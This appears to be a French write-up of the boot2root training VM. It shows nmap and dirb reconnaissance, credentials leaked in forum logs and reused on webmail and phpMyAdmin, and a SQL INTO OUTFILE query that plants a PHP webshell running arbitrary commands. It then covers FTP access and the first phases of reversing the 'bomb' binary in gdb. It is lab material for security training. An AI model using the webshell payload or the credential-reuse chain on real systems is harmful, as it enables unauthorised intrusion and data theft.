# Recherche de l'IP de l'ISO boot2root
On va utiliser **nmap**, qui va nous permet de scanner (dans un premier temps), les IP utilisées par VirtualBox :
<pre><code>> nmap -sP IP-Vbox/24

Nmap scan report for IP (IP)
Host is up (0.0080s latency).
Nmap scan report for IP (IP)
Host is up (0.011s latency).
Nmap scan report for IP (IP)
Host is up (0.0031s latency).
Nmap scan report for IP (IP)
Host is up (0.0040s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.19 seconds
</code></pre>

On teste les IP une à une pour savoir laquelle nous donne quelque chose d'intérressant :
<pre><code>> nmap IP

Nmap scan report for IP (IP)
Host is up (0.0055s latency).
Not shown: 987 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
143/tcp open  imap
443/tcp open  https
465/tcp open  smtps
563/tcp open  snews
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
</code></pre>

Après avoir réussi à trouver l'IP, nous allons chercher l'architecture du site **HTTPS** grâce à **dirb** (*Attaque Brute Force dictionnaire*):
<pre><code>> dirb https://IP

GENERATED WORDS: 4612

---- Scanning URL: https://IP/ ----
+ https://IP/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://IP/forum/
==> DIRECTORY: https://IP/phpmyadmin/
+ https://IP/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://IP/webmail/

</code></pre>

## Partie HTTPS

On se dirige vers **/forum** où l'on  trouve un topic :

 <code>Probleme login ?</code>


On voit que le topic est créé par **lmezard**, et que la page est rempli de log créé par un admin,
on cherche donc le nom **lmezard** dans la page, et on tombe sur ceci:
<pre><code>Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)</code></pre>
>On observe que **lmezard** a tapé son mdp a la place de sopn login: **!q\]Ej?*5K5cy*AJ**

Par la suite, on se connecte au profil de lmezard sur le forum.

<code>Username : lmezard

Password : !q\]Ej?*5K5cy*AJ</code>

On peut trouver sur son profil, son adresse mail :

<pre>laurie@borntosec.net
</pre>

On tente de se connecter sur https://IP/webmail avec le même password et on découvre 2 mails, celui qui nous intéresse est **DB ACCESS**, dans lequel on trouve le login et le mdp pour phpmyadmin

<code>root/Fg-'kKXBj87E:aJ$
</code>

On se connecte phpmyadmin en tant que root. On a donc acces aux requestes sur la base de données, ce qui nous permet d'effectuer un **exploit** qui consite a créer un **Webshell** grâce a la query SQL.

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/phpshell.php'
```

On se dirige vers https://IP/forum/templates_c/phpshell.php (là ou est créer le **webshell**) et on tente de trouver des fichiers ou données a exploiter.
On commence par lister tous les fichiers auquel l'user à accès :

<pre><code>> find / -user www-data -print 2>/dev/null
/home
/home/LOOKATME
/home/LOOKATME/password
...
</code></pre>

On **cat** le fichier :
<pre><code>> cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
</code></pre>

On a donc un user et son password, mais il ne fonctionne pas en ssh.
Cependant grâce au **nmap** effectuer au debut, on sait que le port **FTP** est ouvert (<code>21/tcp  open  ftp</code>), donc on utilise un logiciel tier (**Filezilla) pour se connecter avec 
<pre><code>lmezard
G!@M6f4Eatau{sF"</code></pre>

Ceci nous donnes accès à deux fichiers:
<pre><code>fun
README
</code></pre>

>README:
><pre><code>Complete this little challenge and use the result as password for user 'laurie' to login in ssh</code></pre>

On cherche à savoir le type de fichier de fun :
<pre><code>> file fun
fun: POSIX tar archive (GNU)
</code></pre>

On le decompresse :
<pre><code>tar -xvf fun</code></pre>

En lisant quelques fichiers, que chaque fichier contient un ligne de code en C et on se rend compte qu'il possedent un ordre :
<pre>//file***</pre>

On créer donc un script en **python** qui va nous permettre de créer un fichier **main.c** qui contient la totalité de tous les fichiers mais mis dans l'ordre.
```python
import os
import re

main = {}

for file in os.listdir("ft_fun"):
	with open(f"ft_fun/{file}", "r") as f:
		code = f.read()
		# print(code)
		result = re.findall(r'//file([0-9]*)', code)
		main[int(result[0])] = code

with open("main.c", "w+") as f:
	for value in sorted(main.items()):
		f.write(str(value[1]) + "\n")
```
On compile et teste :
<pre><code>> gcc main.c
> ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%</code></pre>

On applique un sha256:
<pre><code>> openssl sha256
> Iheartpwnage
(stdin)= 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4</code></pre>

On peut maintenant se connecter en **ssh** avec :
<pre>
laurie
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
</pre>

## Partie **./bomb**


### Phase_1
(gdb) > x/s %0x80497c0

<code>0x80497c0:     "Public speaking is very easy."</code>
### Phase_2
breakpoint : compare
print chaque %eax.

<code>1 2 6 24 120 720</code>
### Phase_3
```gdb
...
0x08048bb7 <+31>:    call   0x8048860 <sscanf@plt>	# ("1 b 214", "%d %c %d")
0x08048bbc <+36>:    add    $0x20,%esp
0x08048bbf <+39>:    cmp    $0x2,%eax				#Compare le nombre d'arg de sscanf si moins de 3 explode
0x08048bc2 <+42>:    jg     0x8048bc9 <phase_3+49>
0x08048bc4 <+44>:    call   0x80494fc <explode_bomb>
0x08048bc9 <+49>:    cmpl   $0x7,-0xc(%ebp)			# Compare la valeur du premier arg dans notre cas 1 elle doit être inferieur a 7
0x08048bcd <+53>:    ja     0x8048c88 <phase_3+240>
0x08048bd3 <+59>:    mov    -0xc(%ebp),%eax
0x08048bd6 <+62>:    jmp    *0x80497e8(,%eax,4)		# Jump a l'adress 0x80497e8 + 4 * valeur du premier arg
0x08048bdd <+69>:    lea    0x0(%esi),%esi
0x08048be0 <+72>:    mov    $0x71,%bl
0x08048be2 <+74>:    cmpl   $0x309,-0x4(%ebp)
0x08048be9 <+81>:    je     0x8048c8f <phase_3+247>
0x08048bef <+87>:    call   0x80494fc <explode_bomb>
0x08048bf4 <+92>:    jmp    0x8048c8f <phase_3+247> 
0x08048bf9 <+97>:    lea    0x0(%esi,%eiz,1),%esi
0x08048c00 <+104>:   mov    $0x62,%bl				# Load 214 dans bl
0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)		# Jump a 147  et fini
...
0x08048c86 <+238>:    jmp    0x8048c8f <phase_3+247>
0x08048c88 <+240>:    mov    $0x78,%bl
0x08048c8a <+242>:    call   0x80494fc <explode_bomb>
0x08048c8f <+247>:    cmp    -0x5(%ebp),%bl
0x08048c92 <+250>:    je     0x8048c99 <phase_3+257>
0x08048c94 <+252>:    call   0x80494fc <explode_bomb>
0x08048c99 <+257>:    mov    -0x18(%ebp),%ebx
0x08048c9c <+260>:    mov    %ebp,%esp
0x08048c9e <+262>:    pop    %ebp
0x08048c9f <+263>:    ret
```
<code>1 b 214</code>
### Phase_4
```
0x08048ca0 <+0>:    push   %ebp
0x08048ca1 <+1>:    mov    %esp,%ebp
0x08048ca3 <+3>:    sub    $0x10,%esp
0x08048ca6 <+6>:    push   %esi
0x08048ca7 <+7>:    push   %ebx
0x08048ca8 <+8>:    mov    0x8(%ebp),%ebx
0x08048cab <+11>:    cmp    $0x1,%ebx			<= Si ebx = 1 
0x08048cae <+14>:    jle    0x8048cd0 <func4+48>	|
0x08048cb0 <+16>:    add    $0xfffffff4,%esp		|
0x08048cb3 <+19>:    lea    -0x1(%ebx),%eax			|	ebx -1
0x08048cb6 <+22>:    push   %eax					|
0x08048cb7 <+23>:    call   0x8048ca0 <func4>		|	Récursion
0x08048cbc <+28>:    mov    %eax,%esi				|	eax => esi
0x08048cbe <+30>:    add    $0xfffffff4,%esp		|
0x08048cc1 <+33>:    lea    -0x2(%ebx),%eax			|	ebx -2
0x08048cc4 <+36>:    push   %eax					|
0x08048cc5 <+37>:    call   0x8048ca0 <func4>		|	Récursion
0x08048cca <+42>:    add    %esi,%eax				|	esi + eax
0x08048ccc <+44>:    jmp    0x8048cd5 <func4+53>|	|
0x08048cce <+46>:    mov    %esi,%esi			|	|
0x08048cd0 <+48>:    mov    $0x1,%eax	<-------|---|
0x08048cd5 <+53>:    lea    -0x18(%ebp),%esp <--|
0x08048cd8 <+56>:    pop    %ebx
0x08048cd9 <+57>:    pop    %esi
0x08048cda <+58>:    mov    %ebp,%esp
0x08048cdc <+60>:    pop    %ebp
0x08048cdd <+61>:    ret
```
Qui peut se traduire en **C** par:
```c
#include <stdio.h>
#include <stdlib.h>

int func4(int nb)
{
	static int tmp;

	if (nb <= 1)
		return(1);
	tmp = func4(nb-1);
	tmp = tmp + func4(nb-2);
	return (tmp);
}


int main(int ac, char **av)
{
	int nb;

	nb = atoi(av[1]);
	nb = func4(nb);
	printf("%d\n", nb);
}
```